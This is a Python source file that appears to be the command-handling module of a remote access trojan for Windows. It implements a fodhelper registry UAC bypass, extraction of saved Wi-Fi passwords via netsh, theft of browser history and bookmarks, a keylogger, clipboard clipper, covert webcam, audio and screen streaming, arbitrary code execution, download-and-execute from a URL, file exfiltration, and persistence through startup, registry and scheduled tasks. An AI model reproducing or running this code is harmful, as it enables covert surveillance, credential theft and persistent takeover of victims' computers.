'''
    Functions called upon request specific actions, both
    defined server & client side & correctly registered.
    Constitutes the majority of the client's work.

    Verified: 2020 December 30 & 2021 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
    * Third Party Modules
        * VideoCapture (Windows)
        * browser-history
        * pyperclip
        * GPUtil
        * psutil
        * pynput
        * mss
'''

from client.modules.keylogger import Keylogger
from client.modules.desktop import Desktop
from client.modules.clipper import Clipper
from client.modules.audio import Audio
from client.state import ClientStatic
from client.error import ClientError
from shared.helper import Helper
from shared.state import Static
from client.shell import Shell
from shared.error import Error
from shared.data import Data

import urllib.request
import contextlib
import webbrowser
import mss.tools
import pyperclip
import zipfile
import random
import GPUtil
import psutil
import pynput
import time
import mss
import io
import os

import browser_history
# NOTE : Disable the default logging of the library
browser_history.utils.logger.removeHandler(
    browser_history.utils.handler)

if Static.WINDOWS:
    from client.modules.webcam import Webcam, Capture

    import ctypes
    import vidcap
    import re

    @Error.quiet_thread
    def alert_action(title, text, symbol):
        ctypes.windll.user32.MessageBoxW(0, text, title, symbol)

    if Static.EXE:
        from client.autostart import (AutoShell,
                                      AutoRegistry,
                                      AutoSchedule)

        import winreg

        class Escalate:

            __REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
            __FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
            __DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

            @staticmethod
            def __create_reg_key(key, value):
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, Escalate.__REG_PATH)
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                         Escalate.__REG_PATH,
                                         0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, key, 0, winreg.REG_SZ, value)
                winreg.CloseKey(reg_key)

            @staticmethod
            def __delete_reg_key():
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, Escalate.__REG_PATH)

            @staticmethod
            def start():
                Escalate.__create_reg_key(
                    Escalate.__DELEGATE_EXEC_REG_KEY, None)
                Escalate.__create_reg_key(None, Static.ROOT)
                os.system(Escalate.__FOD_HELPER)
                Escalate.__delete_reg_key()


class Recover:

    if Static.WINDOWS:
        @staticmethod
        def wifi():
            headers, values = ('SSID', 'Authentication', 'Cipher',
                               'Security Key', 'Password'), []

            networks = Shell.run('netsh wlan show profile', True)
            network_names = re.findall(r'(?:Profile\s*:\s)(.*)', networks)

            for network_name in network_names:
                try:
                    data = Shell.run(
                        'netsh wlan show profile {} key=clear'.format(
                            network_name), True)

                    values.append((
                        re.findall(r'(?:SSID name\s*:\s)(.*)', data)[0][1:-1],
                        re.findall(r'(?:Authentication\s*:\s)(.*)', data)[0],
                        re.findall(r'(?:Cipher\s*:\s)(.*)', data)[0],
                        re.findall(r'(?:Security key\s*:\s)(.*)', data)[0],
                        re.findall(r'(?:Key Content\s*:\s)(.*)', data)[0]))
                except Exception:
                    pass

            return (values, headers)

    @staticmethod
    def history():
        result = 'Row,Timestamp,URL\n'

        for row, (timestamp, url) in enumerate(
                browser_history.get_history().histories, 1):
            result += '{},{},{}\n'.format(
                row, Helper.timestamp(timestamp), url)

        return result

    @staticmethod
    def bookmark():
        result = 'Row,Timestamp,URL,Title,Folder\n'

        for row, (timestamp, url, title, folder) in enumerate(
                browser_history.get_bookmarks().bookmarks, 1):
            result += '{},{},{},{},{}\n'.format(
                row, Helper.timestamp(timestamp), url, title, folder)

        return result


class Sysinfo:

    __FACTOR = 1024

    @staticmethod
    def get_size(bolter, suffix='B'):
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if bolter < Sysinfo.__FACTOR:
                return f'{bolter:.2f}{unit}{suffix}'

            bolter /= Sysinfo.__FACTOR

    @staticmethod
    def gpu():
        headers, values = ('ID', 'Name', 'Load', 'Free Memory',
                           'Used Memory', 'Total Memory',
                           'Temperature', 'UUID'), []

        for gpu in GPUtil.getGPUs():
            values.append((gpu.id, gpu.name, f'{gpu.load * 100:.2f}%',
                           Sysinfo.get_size(gpu.memoryFree),
                           Sysinfo.get_size(gpu.memoryUsed),
                           Sysinfo.get_size(gpu.memoryTotal),
                           f'{gpu.temperature:.2f}C', gpu.uuid))

        return (values, headers)

    @staticmethod
    def cpu():
        cpu_frequency = psutil.cpu_freq()

        headers, values = ('CPU Tag', 'Value'), [
            ('Physical Cores', psutil.cpu_count(logical=False)),
            ('Total Cores', psutil.cpu_count(logical=True)),
            ('Max Frequency', f'{cpu_frequency.max:.2f}Mhz'),
            ('Min Frequency', f'{cpu_frequency.min:.2f}Mhz'),
            ('Current Frequency', f'{cpu_frequency.current:.2f}Mhz'),
            ('Total CPU Usage', f'{psutil.cpu_percent():.2f}%')]

        for core, percentage in enumerate(psutil.cpu_percent(
                                          percpu=True, interval=1), 1):
            values.append((f'Core {core} Usage', f'{percentage:.2f}%'))

        return (values, headers)

    @staticmethod
    def memory():
        virtual = psutil.virtual_memory()
        swap = psutil.swap_memory()

        headers, values = ('Memory Tag', 'Value'), (
            ('Total Mem', Sysinfo.get_size(virtual.total)),
            ('Available Mem', Sysinfo.get_size(virtual.available)),
            ('Used Mem', Sysinfo.get_size(virtual.used)),
            ('Percentage', f'{virtual.percent:.2f}%'),
            ('Total Swap', Sysinfo.get_size(swap.total)),
            ('Free Swap', Sysinfo.get_size(swap.free)),
            ('Used Swap', Sysinfo.get_size(swap.used)),
            ('Percentage Swap', f'{swap.percent:.2f}%'))

        return (values, headers)

    @staticmethod
    def disk():
        headers, values = ('Device', 'Mountpoint', 'File System',
                           'Total Size', 'Used', 'Free', 'Percentage'), []

        for partition in psutil.disk_partitions():
            value = [partition.device,
                     partition.mountpoint,
                     partition.fstype]

            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                for _ in range(4):
                    value.append('')
            else:
                value.append(Sysinfo.get_size(partition_usage.total))
                value.append(Sysinfo.get_size(partition_usage.used))
                value.append(Sysinfo.get_size(partition_usage.free))
                value.append(f'{partition_usage.percent:.2f}%')

            values.append(value)

        return (values, headers)

    @staticmethod
    def network():
        headers, values = ('Interface', 'IP Address', 'MAC Address',
                           'Netmask', 'Broadcast IP', 'Broadcast MAC'), []

        for interface_name, interface_addresses \
                in psutil.net_if_addrs().items():

            for address in interface_addresses:
                value = [interface_name]

                if str(address.family) == 'AddressFamily.AF_INET':
                    value.append(address.address)
                    value.append('')
                    value.append(address.netmask)
                    value.append(address.broadcast)
                    value.append('')
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    value.append('')
                    value.append(address.address)
                    value.append(address.netmask)
                    value.append('')
                    value.append(address.broadcast)
                else:
                    for _ in range(5):
                        value.append('')

                values.append(value)

        return (values, headers)

    @staticmethod
    def io():
        disk_io = psutil.disk_io_counters()
        net_io = psutil.net_io_counters()

        headers, values = ('IO Type Total Since Boot', 'Value'), (
            ('File System Read', Sysinfo.get_size(disk_io.read_bytes)),
            ('File System Write', Sysinfo.get_size(disk_io.write_bytes)),
            ('Network Bytes Sent', Sysinfo.get_size(net_io.bytes_sent)),
            ('Network Bytes Received', Sysinfo.get_size(net_io.bytes_recv)))

        return (values, headers)


class Process:

    @staticmethod
    def tasklist():
        headers, values = ('PID', 'Name', 'Status',
                           'CPU Usage', 'Memory Usage'), []

        for process in psutil.process_iter():
            value = [process.ppid(),
                     process.name(),
                     process.status(),
                     f'{process.cpu_percent():.2f}%']

            try:
                value.append(Sysinfo.get_size(
                    process.memory_full_info().uss))
            except psutil.AccessDenied:
                value.append('Access Denied')

            values.append(value)

        values.sort()
        return (values, headers)

    @staticmethod
    def network():
        headers, values = ('Local Address', 'Foreign Address',
                           'Family', 'Protocol', 'Status', 'PID'), []

        for process in psutil.net_connections():
            try:
                laddr, raddr, family, addr_type = ('', '',
                                                   str(process.family),
                                                   str(process.type))
                if process.laddr:
                    laddr = '{}:{}'.format(*process.laddr)

                if process.raddr:
                    raddr = '{}:{}'.format(*process.laddr)

                if family.endswith('AF_INET'):
                    family = 'IPV4'
                elif family.endswith('AF_INET6'):
                    family = 'IPV6'
                else:
                    family = 'UNIX'

                if addr_type.endswith('SOCK_STREAM'):
                    addr_type = 'TCP'
                elif addr_type.endswith('SOCK_DGRAM'):
                    addr_type = 'UDP'
                else:
                    addr_type = 'SCTP'

                values.append((laddr, raddr, family, addr_type,
                               process.status, process.pid))
            except Exception:
                pass

        values.sort()
        return (values, headers)

    @staticmethod
    def kill(pid):
        psutil.Process(pid).kill()


class Inject:

    def __init__(self):
        self.__keyboard = pynput.keyboard.Controller()
        self.__mouse = pynput.mouse.Controller()

    def run(self, script):
        for row, command in enumerate(script, 1):
            command = command.split()
            key, value = (command[0].lower(),
                          ' '.join(command[1:]))

            if key == 'repeat':
                for _ in range(int(value)):
                    self.run(script[row:])
                else:
                    break
            else:
                self.__execute(key, value)

    def __execute(self, key, value):
        if key == 'press':
            result = self.__key(value)
            self.__keyboard.press(result)
            self.__keyboard.release(result)
        elif key == 'hold':
            self.__keyboard.press(self.__key(value))
        elif key == 'release':
            self.__keyboard.release(self.__key(value))
        elif key == 'type':
            self.__keyboard.type(value)
        elif key == 'position':
            self.__mouse.position = tuple(self.__x_y(value))
        elif key == 'move':
            self.__mouse.move(*self.__x_y(value))
        elif key == 'scroll':
            self.__mouse.scroll(*self.__x_y(value))
        elif key == 'mhold':
            self.__mouse.press(self.__button(value))
        elif key == 'mrelease':
            self.__mouse.release(self.__button(value))
        elif key == 'click':
            result = self.__button(value)
            self.__mouse.press(result)
            self.__mouse.release(result)
        elif key == 'dclick':
            self.__mouse.click(self.__button(value), 2)
        elif key == 'sleep':
            time.sleep(float(value))
        else:
            raise SyntaxError('Injection Syntax Error')

    def __x_y(self, value):
        values = value.split()

        if values[0].lower() == 'random':
            numbers = [int(pos) for pos in
                       ' '.join(values[1:]).split(',')]
            return (random.randint(*numbers[:2]),
                    random.randint(*numbers[2:4]))
        else:
            return (int(pos) for pos in value.split(','))

    def __button(self, value):
        return eval(f'pynput.mouse.Button.{value}')

    def __key(self, value):
        return eval(f'pynput.keyboard.Key.{value}')


@ClientError.general
def clipboard(request):
    request, store = Helper.store(request, ('copy', 'empty'))

    if store.copy:
        pyperclip.copy(store.copy)
        return Data.parse('Copied to clipboard',
                          status=Static.SUCCESS)
    elif store.empty:
        pyperclip.copy('')
        return Data.parse('Clipboard emptied',
                          status=Static.SUCCESS)
    else:
        return Data.parse(pyperclip.paste(), raw=True)


@ClientError.general
def screenshot(request):
    request, store = Helper.store(request, ('monitor',))
    assert type(store.monitor) is int, 'Client Argument Error'

    with mss.mss() as sct:
        size = sct.monitors[store.monitor]
        raw_bytes = sct.grab(size)
        raw_bytes = mss.tools.to_png(raw_bytes.rgb,
                                     raw_bytes.size)

        return Data.parse('Screenshot taken (monitor {}, {}x{})'.format(
            store.monitor, size['width'], size['height']),
                          status=Static.SUCCESS,
                          custom=Data.b64encode(raw_bytes))


@ClientError.general
def snapshot(request):
    if Static.WINDOWS:
        request, store = Helper.store(request, ('device',))
        assert (type(store.device) is int
                and store.device > 0), 'Client Argument Error'

        device = vidcap.new_Dev(store.device - 1, False)
        buffer, width, height = device.getbuffer()
        raw_bytes = mss.tools.to_png(buffer, (width, height))

        return Data.parse('Snapshot taken (device {}, {}x{}, {})'.format(
            store.device, width, height, device.getdisplayname()),
                          status=Static.SUCCESS,
                          custom=Data.b64encode(raw_bytes))
    else:
        raise OSError('Feature Not Available')


@ClientError.general
def python(request):
    request, store = Helper.store(request, ('exec',))
    assert store.exec, 'Client Argument Error'

    buffer = io.StringIO()

    with contextlib.redirect_stdout(buffer):
        exec(store.exec)

    return Data.parse(buffer.getvalue(), raw=True)


@ClientError.general
def inject(request):
    request, store = Helper.store(request, ('exec', 'unblock'))
    assert store.exec and type(store.exec) is list, 'Client Argument Error'

    if store.unblock:
        Helper.thread(Error.quiet_thread(Inject().run), store.exec)
        return Data.parse('Injection started', status=Static.INFO)
    else:
        Inject().run(store.exec)
        return Data.parse('Injection complete',
                          status=Static.SUCCESS)


@ClientError.general
def browse(request):
    request, store = Helper.store(request, ('url',))
    assert store.url and type(store.url) is list, 'Client Argument Error'

    for url in store.url:
        webbrowser.open(url, 1)

    return Data.parse('URL{} opened'.format(
        Helper.plural(store.url)), status=Static.SUCCESS)


@ClientError.general
def alert(request):
    request, store = Helper.store(request, ('title', 'text', 'symbol'))
    assert all((store.title, store.text,
                store.symbol in (16, 32, 48, 64))), 'Client Argument Error'

    if Static.WINDOWS:
        Helper.thread(alert_action, store.title,
                      store.text, store.symbol)
        return Data.parse('Messagebox shown',
                          status=Static.SUCCESS)
    else:
        raise OSError('Feature Not Available')


@ClientError.general
def system(request):
    request, store = Helper.store(request, ('shutdown', 'restart',
                                            'logout', 'hibernate',
                                            'standby'))
    assert any((store.shutdown, store.restart,
                store.logout, store.hibernate,
                store.standby)), 'Client Argument Error'

    if Static.WINDOWS:
        if store.shutdown:
            os.system('shutdown /p /f')
            return Data.parse('Shutdown complete',
                              status=Static.SUCCESS)
        elif store.restart:
            os.system('shutdown /r /f /t 0')
            return Data.parse('Restart complete',
                              status=Static.SUCCESS)
        elif store.logout:
            os.system('shutdown /l /f')
            return Data.parse('Logout complete',
                              status=Static.SUCCESS)
        elif store.hibernate:
            os.system('shutdown /h')
            return Data.parse('Hibernate complete',
                              status=Static.SUCCESS)
        else:
            os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
            return Data.parse('Standby complete',
                              status=Static.SUCCESS)
    else:
        raise OSError('Feature Not Available')


@ClientError.general
def download(request):
    request, store = Helper.store(request, ('file', 'dir'))
    assert store.file or store.dir, 'Client Argument Error'

    if store.file:
        assert os.path.isfile(store.file), 'File Not Found'
        return Data.parse(f'Download complete ({store.file})',
                          status=Static.SUCCESS,
                          custom=Data.b64encode(Helper.read_file(
                              store.file, Helper.READ_BYTES)))
    else:
        assert os.path.isdir(store.dir), 'Directory Not Found'

        buffer = io.BytesIO()
        relroot = os.path.abspath(
            os.path.join(store.dir, os.pardir))

        with zipfile.ZipFile(buffer, Helper.WRITE,
                             zipfile.ZIP_DEFLATED) as archive:
            for root, _, files in os.walk(store.dir):
                archive.write(root, os.path.relpath(root, relroot))

                for file in files:
                    filename = os.path.join(root, file)

                    if os.path.isfile(filename):
                        arcname = os.path.join(
                            os.path.relpath(root, relroot), file)
                        archive.write(filename, arcname)

        return Data.parse(f'Download complete ({store.dir})',
                          status=Static.SUCCESS,
                          custom=Data.b64encode(buffer.getvalue()))


@ClientError.general
def upload(request):
    request, store = Helper.store(request, ('file', 'url',
                                            'execute', 'custom'))
    assert store.url or (store.file and store.custom), 'Client Argument Error'

    if store.file:
        Helper.write_file(store.file, Data.b64decode(
                          store.custom), Helper.WRITE_BYTES)

        if store.execute:
            Helper.start(store.file)

        return Data.parse(f'Upload complete ({store.file})',
                          status=Static.SUCCESS)
    else:
        filename = os.path.split(store.url)[1]
        Helper.write_file(filename, urllib.request.urlopen(
                          store.url).read(), Helper.WRITE_BYTES)

        if store.execute:
            Helper.start(filename)

        return Data.parse(f'URL upload complete ({store.url})',
                          status=Static.SUCCESS)


@ClientError.general
def escalate(request):
    assert Static.EXE, 'Requires Executable Build'

    if Static.WINDOWS:
        Escalate.start()
        return Data.parse('Escalation started',
                          status=Static.INFO)
    else:
        raise OSError('Feature Not Available')


@ClientError.general
def autostart(request):
    assert Static.EXE, 'Requires Executable Build'

    request, store = Helper.store(request, ('shell', 'registry', 'schedule'))
    assert any((store.shell, store.registry,
                store.schedule)), 'Client Argument Error'

    if Static.WINDOWS:
        if store.shell:
            AutoShell.install()
            return Data.parse('Added to startup directory',
                              status=Static.SUCCESS)
        elif store.registry:
            AutoRegistry.install()
            return Data.parse('Added to registry startup',
                              status=Static.SUCCESS)
        else:
            AutoSchedule.install()
            return Data.parse('Added to task scheduler',
                              status=Static.SUCCESS)
    else:
        raise OSError('Feature Not Available')


@ClientError.general
def recover(request):
    request, store = Helper.store(request, ('wifi', 'history', 'bookmark'))
    assert any((store.wifi, store.history,
                store.bookmark)), 'Client Argument Error'

    if store.wifi:
        if Static.WINDOWS:
            return Data.message(Recover.wifi())
        else:
            raise OSError('Feature Not Available')
    elif store.history:
        return Data.parse('History downloaded',
                          status=Static.SUCCESS,
                          custom=Recover.history())
    else:
        return Data.parse('Bookmarks downloaded',
                          status=Static.SUCCESS,
                          custom=Recover.bookmark())


@ClientError.general
def process(request):
    request, store = Helper.store(request, ('kill', 'tasklist', 'network'))
    assert any((store.kill, store.tasklist,
                store.network)), 'Client Argument Error'

    if store.tasklist:
        return Data.message(Process.tasklist())
    elif store.network:
        return Data.message(Process.network())
    else:
        Process.kill(int(store.kill))
        return Data.parse(f'Process killed ({store.kill})',
                          status=Static.SUCCESS)


@ClientError.general
def sysinfo(request):
    request, store = Helper.store(request, ('gpu', 'cpu', 'memory',
                                            'disk', 'network', 'io'))
    assert any((store.gpu, store.cpu, store.memory, store.disk,
                store.network, store.io)), 'Client Argument Error'

    if store.gpu:
        return Data.message(Sysinfo.gpu())
    elif store.cpu:
        return Data.message(Sysinfo.cpu())
    elif store.memory:
        return Data.message(Sysinfo.memory())
    elif store.disk:
        return Data.message(Sysinfo.disk())
    elif store.network:
        return Data.message(Sysinfo.network())
    else:
        return Data.message(Sysinfo.io())


@ClientError.general
def desktop(request):
    request, store = Helper.store(request, ('monitor', 'token'))
    assert type(store.monitor) is int and store.token, \
        'Client Argument Error'

    Desktop(store.token).live(store.monitor)
    return Data.parse(f'Desktop stream started (monitor {store.monitor})',
                      status=Static.INFO)


@ClientError.general
def webcam(request):
    if Static.WINDOWS:
        request, store = Helper.store(request, ('device', 'token'))
        assert (type(store.device) is int and store.device > 0
                and store.token), 'Client Argument Error'

        device = vidcap.new_Dev(store.device - 1, False)
        ClientStatic.WEBCAM[store.token] = Capture(device)
        Webcam(store.token).live()

        return Data.parse('Webcam stream started (device {}, {})'.format(
            store.device, device.getdisplayname()), status=Static.INFO)
    else:
        raise OSError('Feature Not Available')


@ClientError.general
def audio(request):
    request, store = Helper.store(request, ('channels', 'rate', 'token'))
    assert (type(store.channels) is int and type(store.rate) is int
            and store.token), 'Client Argument Error'

    Audio(store.token).live(store.channels, store.rate)
    return Data.parse('Audio stream started',
                      status=Static.INFO)


@ClientError.general
def keylogger(request):
    request, store = Helper.store(request, ('token',))
    assert store.token, 'Client Argument Error'

    Keylogger(store.token).live()
    return Data.parse('Keylogger started',
                      status=Static.INFO)


@ClientError.general
def clipper(request):
    request, store = Helper.store(request, ('token',))
    assert store.token, 'Client Argument Error'

    Clipper(store.token).live()
    return Data.parse('Clipper started',
                      status=Static.INFO)
